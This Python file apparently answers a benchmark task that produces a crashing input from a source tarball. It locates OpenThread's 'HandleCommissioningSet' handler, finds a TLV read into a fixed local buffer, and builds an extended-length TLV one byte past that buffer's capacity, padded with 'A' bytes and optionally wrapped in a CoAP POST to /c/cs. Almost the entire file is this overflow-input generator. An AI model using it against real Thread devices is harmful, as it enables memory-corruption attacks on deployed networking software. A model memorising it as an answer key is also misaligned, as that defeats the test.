import re
import tarfile
from dataclasses import dataclass
from typing import Dict, Optional, Tuple, List


def _strip_comments(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    state = 0  # 0 normal, 1 line, 2 block, 3 dq, 4 sq, 5 rawstr
    raw_delim = ""
    while i < n:
        c = s[i]
        if state == 0:
            if c == "/" and i + 1 < n and s[i + 1] == "/":
                state = 1
                i += 2
                continue
            if c == "/" and i + 1 < n and s[i + 1] == "*":
                state = 2
                i += 2
                continue
            if c == '"':
                state = 3
                out.append(c)
                i += 1
                continue
            if c == "'":
                state = 4
                out.append(c)
                i += 1
                continue
            if c == "R" and i + 1 < n and s[i + 1] == '"':
                j = i + 2
                while j < n and s[j] != "(":
                    j += 1
                if j < n and s[j] == "(":
                    raw_delim = s[i + 2 : j]
                    state = 5
                    out.append('R"')
                    out.append(raw_delim)
                    out.append("(")
                    i = j + 1
                    continue
            out.append(c)
            i += 1
        elif state == 1:
            if c == "\n":
                out.append(c)
                state = 0
            i += 1
        elif state == 2:
            if c == "*" and i + 1 < n and s[i + 1] == "/":
                state = 0
                i += 2
            else:
                i += 1
        elif state == 3:
            out.append(c)
            if c == "\\" and i + 1 < n:
                out.append(s[i + 1])
                i += 2
                continue
            if c == '"':
                state = 0
            i += 1
        elif state == 4:
            out.append(c)
            if c == "\\" and i + 1 < n:
                out.append(s[i + 1])
                i += 2
                continue
            if c == "'":
                state = 0
            i += 1
        else:  # raw string
            out.append(c)
            i += 1
            if c == ")":
                end = '"' + raw_delim
                if i + len(end) <= n and s[i : i + len(end)] == end:
                    out.append(end)
                    i += len(end)
                    state = 0
                    raw_delim = ""
    return "".join(out)


def _safe_int_eval(expr: str, consts: Dict[str, int]) -> Optional[int]:
    if not expr:
        return None
    if "sizeof" in expr or "decltype" in expr:
        return None
    e = expr.strip()
    e = re.sub(r"\btrue\b", "1", e)
    e = re.sub(r"\bfalse\b", "0", e)
    e = re.sub(r"(0x[0-9A-Fa-f]+)([uUlL]+)\b", r"\1", e)
    e = re.sub(r"\b(\d+)([uUlL]+)\b", r"\1", e)
    e = re.sub(r"\b(static_cast|reinterpret_cast|const_cast)\s*<[^>]*>\s*\(", "(", e)

    toks = set(re.findall(r"\b[A-Za-z_]\w*\b", e))
    reserved = {
        "and",
        "or",
        "not",
        "if",
        "else",
        "return",
        "struct",
        "class",
        "enum",
        "const",
        "constexpr",
        "static",
        "inline",
        "volatile",
        "signed",
        "unsigned",
        "short",
        "long",
        "int",
        "char",
        "float",
        "double",
        "bool",
        "void",
        "uint8_t",
        "uint16_t",
        "uint32_t",
        "uint64_t",
        "int8_t",
        "int16_t",
        "int32_t",
        "int64_t",
        "size_t",
        "ssize_t",
        "ptrdiff_t",
        "nullptr",
        "NULL",
    }
    for t in sorted(toks, key=len, reverse=True):
        if t in reserved:
            continue
        if t in consts:
            e = re.sub(r"\b" + re.escape(t) + r"\b", str(consts[t]), e)

    if re.search(r"\b[A-Za-z_]\w*\b", e):
        return None
    if re.search(r"[^\d\s\(\)\+\-\*\/%<>&\|\^~xXA-Fa-f]", e):
        return None

    try:
        val = eval(e, {"__builtins__": None}, {})
    except Exception:
        return None
    if isinstance(val, bool):
        return int(val)
    if isinstance(val, int):
        return val
    return None


def _extract_brace_block(s: str, open_brace_idx: int) -> Optional[Tuple[int, int]]:
    n = len(s)
    i = open_brace_idx
    if i < 0 or i >= n or s[i] != "{":
        return None
    depth = 0
    state = 0  # 0 normal, 1 line, 2 block, 3 dq, 4 sq, 5 raw
    raw_delim = ""
    while i < n:
        c = s[i]
        if state == 0:
            if c == "/" and i + 1 < n and s[i + 1] == "/":
                state = 1
                i += 2
                continue
            if c == "/" and i + 1 < n and s[i + 1] == "*":
                state = 2
                i += 2
                continue
            if c == '"':
                state = 3
                i += 1
                continue
            if c == "'":
                state = 4
                i += 1
                continue
            if c == "R" and i + 1 < n and s[i + 1] == '"':
                j = i + 2
                while j < n and s[j] != "(":
                    j += 1
                if j < n and s[j] == "(":
                    raw_delim = s[i + 2 : j]
                    state = 5
                    i = j + 1
                    continue
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return open_brace_idx, i
            i += 1
        elif state == 1:
            if c == "\n":
                state = 0
            i += 1
        elif state == 2:
            if c == "*" and i + 1 < n and s[i + 1] == "/":
                state = 0
                i += 2
            else:
                i += 1
        elif state == 3:
            if c == "\\" and i + 1 < n:
                i += 2
            else:
                if c == '"':
                    state = 0
                i += 1
        elif state == 4:
            if c == "\\" and i + 1 < n:
                i += 2
            else:
                if c == "'":
                    state = 0
                i += 1
        else:  # raw
            if c == ")":
                end = '"' + raw_delim
                if i + 1 + len(end) <= n and s[i + 1 : i + 1 + len(end)] == end:
                    state = 0
                    raw_delim = ""
                    i += 1 + len(end)
                else:
                    i += 1
            else:
                i += 1
    return None


def _split_top_level_commas(arg_str: str) -> List[str]:
    args = []
    cur = []
    depth_paren = 0
    depth_brack = 0
    depth_brace = 0
    state = 0  # 0 normal, 1 dq, 2 sq, 3 line, 4 block, 5 raw
    raw_delim = ""
    i = 0
    n = len(arg_str)
    while i < n:
        c = arg_str[i]
        if state == 0:
            if c == "/" and i + 1 < n and arg_str[i + 1] == "/":
                state = 3
                cur.append(c)
                i += 1
            elif c == "/" and i + 1 < n and arg_str[i + 1] == "*":
                state = 4
                cur.append(c)
                i += 1
            elif c == '"':
                state = 1
                cur.append(c)
            elif c == "'":
                state = 2
                cur.append(c)
            elif c == "R" and i + 1 < n and arg_str[i + 1] == '"':
                j = i + 2
                while j < n and arg_str[j] != "(":
                    j += 1
                if j < n and arg_str[j] == "(":
                    raw_delim = arg_str[i + 2 : j]
                    state = 5
                    cur.append(arg_str[i : j + 1])
                    i = j
                else:
                    cur.append(c)
            elif c == "(":
                depth_paren += 1
                cur.append(c)
            elif c == ")":
                depth_paren = max(0, depth_paren - 1)
                cur.append(c)
            elif c == "[":
                depth_brack += 1
                cur.append(c)
            elif c == "]":
                depth_brack = max(0, depth_brack - 1)
                cur.append(c)
            elif c == "{":
                depth_brace += 1
                cur.append(c)
            elif c == "}":
                depth_brace = max(0, depth_brace - 1)
                cur.append(c)
            elif c == "," and depth_paren == 0 and depth_brack == 0 and depth_brace == 0:
                args.append("".join(cur).strip())
                cur = []
            else:
                cur.append(c)
        elif state == 1:
            cur.append(c)
            if c == "\\" and i + 1 < n:
                cur.append(arg_str[i + 1])
                i += 1
            elif c == '"':
                state = 0
        elif state == 2:
            cur.append(c)
            if c == "\\" and i + 1 < n:
                cur.append(arg_str[i + 1])
                i += 1
            elif c == "'":
                state = 0
        elif state == 3:
            cur.append(c)
            if c == "\n":
                state = 0
        elif state == 4:
            cur.append(c)
            if c == "*" and i + 1 < n and arg_str[i + 1] == "/":
                cur.append("/")
                i += 1
                state = 0
        else:  # raw
            cur.append(c)
            if c == ")":
                end = '"' + raw_delim
                if i + 1 + len(end) <= n and arg_str[i + 1 : i + 1 + len(end)] == end:
                    cur.append(arg_str[i + 1 : i + 1 + len(end)])
                    i += len(end)
                    state = 0
                    raw_delim = ""
        i += 1
    if cur:
        args.append("".join(cur).strip())
    return args


@dataclass
class _Candidate:
    type_name: str
    type_val: int
    length: int


class Solution:
    def solve(self, src_path: str) -> bytes:
        files = self._load_text_files(src_path)
        consts = self._build_constants(files)
        endian = self._detect_extended_length_endian(files)  # "be" or "le"
        input_kind = self._detect_input_kind(files)

        func = self._find_function_body(files, "HandleCommissioningSet")
        cand = None
        if func is not None:
            cand = self._select_candidate_from_function(func, consts)

        if cand is None:
            cand = self._fallback_candidate(consts)

        tlv = self._build_extended_tlv(cand.type_val, cand.length, endian=endian)

        if input_kind == "coap":
            return self._wrap_coap_ccs(tlv)
        return tlv

    def _load_text_files(self, src_path: str) -> Dict[str, str]:
        texts: Dict[str, str] = {}
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    name = m.name
                    if m.size <= 0 or m.size > 2_500_000:
                        continue
                    lower = name.lower()
                    if not any(lower.endswith(ext) for ext in (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    try:
                        s = data.decode("utf-8", "ignore")
                    except Exception:
                        continue
                    texts[name] = s
        except Exception:
            return {}
        return texts

    def _build_constants(self, files: Dict[str, str]) -> Dict[str, int]:
        exprs: Dict[str, str] = {}
        values: Dict[str, int] = {}

        define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*$", re.M)
        constexpr_re = re.compile(
            r"\b(?:static\s+)?(?:inline\s+)?constexpr\s+[A-Za-z_:\d<>]+\s+([A-Za-z_]\w*)\s*=\s*([^;]+);"
        )
        const_re = re.compile(r"\b(?:static\s+)?const\s+[A-Za-z_:\d<>]+\s+([A-Za-z_]\w*)\s*=\s*([^;]+);")

        for _, content in files.items():
            s = _strip_comments(content)

            for m in define_re.finditer(s):
                name = m.group(1)
                if "(" in name:
                    continue
                rhs = m.group(2).strip()
                if rhs.startswith("\\"):
                    continue
                rhs = rhs.split("//", 1)[0].strip()
                rhs = rhs.split("/*", 1)[0].strip()
                if not rhs:
                    continue
                if re.match(r"^[\(\)\s0-9xXa-fA-F\+\-\*/%<>&\|\^~]+$", rhs):
                    exprs.setdefault(name, rhs)

            for m in constexpr_re.finditer(s):
                name = m.group(1)
                rhs = m.group(2).strip()
                exprs.setdefault(name, rhs)

            for m in const_re.finditer(s):
                name = m.group(1)
                rhs = m.group(2).strip()
                exprs.setdefault(name, rhs)

            # Parse enum blocks with sequential values
            for em in re.finditer(r"\benum\b(?:\s+class\b)?(?:\s+\w+)?\s*{", s):
                start = em.end()
                close = s.find("};", start)
                if close == -1:
                    close = s.find("}", start)
                    if close == -1:
                        continue
                body = s[start:close]
                parts = body.split(",")
                cur_val = 0
                has_any = False
                for part in parts:
                    t = part.strip()
                    if not t:
                        continue
                    t = re.sub(r"\s*=\s*", "=", t)
                    t = t.split(":", 1)[0].strip()
                    m = re.match(r"^([A-Za-z_]\w*)(?:\s*=\s*(.+))?$", t)
                    if not m:
                        continue
                    nm = m.group(1)
                    rhs = m.group(2)
                    if rhs is not None:
                        v = _safe_int_eval(rhs.strip(), values)
                        if v is None:
                            exprs.setdefault(nm, rhs.strip())
                            has_any = True
                        else:
                            values[nm] = v
                            cur_val = v + 1
                            has_any = True
                    else:
                        values.setdefault(nm, cur_val)
                        cur_val += 1
                        has_any = True
                if has_any:
                    continue

        # Resolve expressions iteratively
        for _ in range(12):
            progressed = False
            for name, rhs in list(exprs.items()):
                if name in values:
                    continue
                v = _safe_int_eval(rhs, values)
                if v is not None:
                    values[name] = v
                    progressed = True
            if not progressed:
                break

        return values

    def _detect_extended_length_endian(self, files: Dict[str, str]) -> str:
        # Default big-endian for network TLVs.
        for path, content in files.items():
            lower = path.lower()
            if "tlv" not in lower and "tlvs" not in lower:
                continue
            s = _strip_comments(content)
            if "ExtendedLength" in s or "kExtendedLength" in s:
                if "LittleEndian" in s and "ReadUint16" in s:
                    return "le"
                if "BigEndian" in s and "ReadUint16" in s:
                    return "be"
                if "HostSwap16" in s and ("mExtendedLength" in s or "GetExtendedLength" in s):
                    return "be"
        return "be"

    def _find_function_body(self, files: Dict[str, str], func_name: str) -> Optional[str]:
        pat = re.compile(r"\b" + re.escape(func_name) + r"\s*\(")
        for _, content in files.items():
            s = content
            for m in pat.finditer(s):
                idx = m.start()
                brace = s.find("{", m.end())
                if brace == -1:
                    continue
                between = s[m.end() : brace]
                if ";" in between:
                    continue
                block = _extract_brace_block(s, brace)
                if block is None:
                    continue
                a, b = block
                return s[a : b + 1]
        return None

    def _select_candidate_from_function(self, func_body: str, consts: Dict[str, int]) -> Optional[_Candidate]:
        s = _strip_comments(func_body)

        case_matches = list(re.finditer(r"\bcase\s+([A-Za-z_:\d]+)\s*:", s))
        cases: List[Tuple[int, str]] = [(m.start(), m.group(1)) for m in case_matches]

        # Find .Read(...) calls where size depends on GetSize/GetLength.
        read_positions = []
        i = 0
        while True:
            j = s.find(".Read(", i)
            if j == -1:
                break
            open_paren = s.find("(", j)
            if open_paren == -1:
                break
            k = open_paren + 1
            depth = 1
            state = 0
            while k < len(s) and depth > 0:
                c = s[k]
                if state == 0:
                    if c == '"' or c == "'":
                        state = 1
                    elif c == "(":
                        depth += 1
                    elif c == ")":
                        depth -= 1
                else:
                    if c == "\\":
                        k += 1
                    elif c == '"' or c == "'":
                        state = 0
                k += 1
            if depth != 0:
                break
            call = s[j:k]
            read_positions.append((j, call))
            i = k

        # Parse local arrays declared in function
        arrays: Dict[str, Optional[int]] = {}
        for m in re.finditer(r"\b(?:uint8_t|char)\s+([A-Za-z_]\w*)\s*\[\s*([^\]]+)\s*\]\s*;", s):
            name = m.group(1)
            expr = m.group(2).strip()
            val = _safe_int_eval(expr, consts)
            arrays[name] = val

        def is_commissionerish(name: str) -> bool:
            n = name.split("::")[-1]
            key = n.lower()
            return (
                "commission" in key
                or "steering" in key
                or "joiner" in key
                or "borderagent" in key
                or "border_agent" in key
                or "ba" == key
                or "locator" in key
                or "meshcop" in key
                or "commissioning" in key
            )

        best: Optional[_Candidate] = None
        best_len = None

        for pos, call in read_positions:
            inside = call[call.find("(") + 1 : call.rfind(")")]
            args = _split_top_level_commas(inside)
            if len(args) < 3:
                continue
            size_arg = args[1]
            if "GetSize" not in size_arg and "GetLength" not in size_arg:
                continue
            dest_arg = args[2].strip()

            # Determine nearest preceding case
            case_name = ""
            for cpos, cname in cases:
                if cpos <= pos:
                    case_name = cname
                else:
                    break
            if not case_name:
                continue
            if not is_commissionerish(case_name):
                continue

            type_name = case_name
            leaf = type_name.split("::")[-1]
            type_val = consts.get(type_name, consts.get(leaf))
            if type_val is None:
                continue
            if not (0 <= type_val <= 255):
                continue

            # Determine destination capacity, if it is a local array
            dest_leaf = None
            if dest_arg.startswith("&"):
                dest_arg2 = dest_arg[1:].strip()
            else:
                dest_arg2 = dest_arg
            mm = re.findall(r"\b([A-Za-z_]\w*)\b", dest_arg2)
            if mm:
                dest_leaf = mm[-1]
            cap = arrays.get(dest_leaf) if dest_leaf else None

            # Choose length: overflow by 1 if capacity known; else use a conservative size.
            if cap is not None and cap > 0:
                L = cap + 1
            else:
                L = 900

            if L < 256:
                L = 256
            if L > 2000:
                L = 2000

            cand = _Candidate(type_name=type_name, type_val=type_val, length=L)
            if best is None:
                best = cand
                best_len = L
            else:
                if best_len is None or L < best_len:
                    best = cand
                    best_len = L

        if best is not None:
            return best

        # Fallback: pick a commissioner-related constant from the function's case labels
        for _, cname in cases:
            if not is_commissionerish(cname):
                continue
            leaf = cname.split("::")[-1]
            v = consts.get(cname, consts.get(leaf))
            if v is None or not (0 <= v <= 255):
                continue
            return _Candidate(type_name=cname, type_val=v, length=900)

        return None

    def _fallback_candidate(self, consts: Dict[str, int]) -> _Candidate:
        preferred_names = [
            "kCommissioningData",
            "kCommissionerDataset",
            "kCommissionerSet",
            "kCommissioner",
            "kCommissionerSessionId",
            "kSteeringData",
            "kBorderAgentLocator",
            "kJoinerUdpPort",
        ]
        for name in preferred_names:
            if name in consts and 0 <= consts[name] <= 255:
                return _Candidate(type_name=name, type_val=consts[name], length=900)
        # Try any constant containing "Commission" that looks like a TLV type (0..255)
        for k, v in consts.items():
            if 0 <= v <= 255 and ("Commission" in k or "commission" in k) and k.startswith("k"):
                return _Candidate(type_name=k, type_val=v, length=900)
        # Hard fallback: choose a plausible TLV type number
        return _Candidate(type_name="0x0e", type_val=0x0E, length=900)

    def _build_extended_tlv(self, tlv_type: int, length: int, endian: str = "be") -> bytes:
        if length < 0:
            length = 0
        if length > 0xFFFF:
            length = 0xFFFF
        if endian == "le":
            ext = bytes([length & 0xFF, (length >> 8) & 0xFF])
        else:
            ext = bytes([(length >> 8) & 0xFF, length & 0xFF])
        header = bytes([tlv_type & 0xFF, 0xFF]) + ext
        value = b"A" * length
        return header + value

    def _wrap_coap_ccs(self, payload: bytes) -> bytes:
        # Minimal CoAP NON POST /c/cs with payload marker and our payload.
        # Header: ver=1, type=NON, tkl=0 => 0x50. Code POST => 0x02. MID 0x0001
        hdr = bytes([0x50, 0x02, 0x00, 0x01])
        # Options: Uri-Path "c" (opt 11, len 1) => 0xB1 'c'
        #          Uri-Path "cs" (delta 0, len 2) => 0x02 'c''s'
        opts = bytes([0xB1, ord("c"), 0x02, ord("c"), ord("s")])
        return hdr + opts + b"\xFF" + payload

    def _detect_input_kind(self, files: Dict[str, str]) -> str:
        # Decide whether the harness expects raw TLVs or full CoAP bytes.
        # Default to raw.
        call_sites: List[Tuple[str, str]] = []
        for path, content in files.items():
            if "HandleCommissioningSet" not in content:
                continue
            if "::HandleCommissioningSet" in content:
                # still could be a call, but likely definition
                pass
            if "LLVMFuzzerTestOneInput" in content or re.search(r"\bint\s+main\s*\(", content):
                call_sites.append((path, content))

        for _, s in call_sites:
            ss = _strip_comments(s)
            if re.search(r"\bInitFrom\s*\(\s*(?:data|aData|input|buf)", ss) and ("Coap" in ss or "coap" in ss):
                return "coap"
            if ("Coap::Message" in ss or "ot::Coap::Message" in ss) and ".Append" in ss and "SetPayloadMarker" in ss:
                return "raw"
            if "coap" in ss.lower() and "/c/cs" in ss:
                # likely coap wrapper, but unsure; prefer raw unless explicit init-from
                continue

        # Additional hint: if harness mentions Uri-Path options, it's likely consuming full CoAP bytes
        for _, s in call_sites:
            ss = _strip_comments(s)
            if "Uri-Path" in ss and ("InitFrom" in ss or "Parse" in ss):
                return "coap"

        return "raw"